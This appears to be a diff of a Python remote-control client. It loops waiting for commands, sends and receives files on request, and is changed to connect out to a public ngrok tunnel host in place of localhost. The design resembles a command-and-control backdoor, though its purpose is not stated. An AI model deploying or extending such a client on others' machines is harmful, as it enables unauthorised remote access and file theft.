@@ -2,8 +2,8 @@ import time
 from bestSocket import *
 from bCCmd import *
 
-URL = '127.0.0.1'
-PORT = 9090
+URL = '0.tcp.eu.ngrok.io'
+PORT = 10659
 
 while 1:
     prefix = b''
@@ -24,9 +24,13 @@ while 1:
           
                 match asp[0].lower():
                     case b'lfile':
-                        bs.recvFile(asp[1])
+                        for i in bs.recvFile(asp[1]):
+                            if i=='Ok!' or i=='Wrong!':
+                                break
                     case b'sfile':
-                        bs.sendFile(asp[1])
+                        for i in bs.sendFile(asp[1]):
+                            if i=='Ok!' or i=='Wrong!':
+                                break
                     case b'n':
                         bc.send(b'')
                       
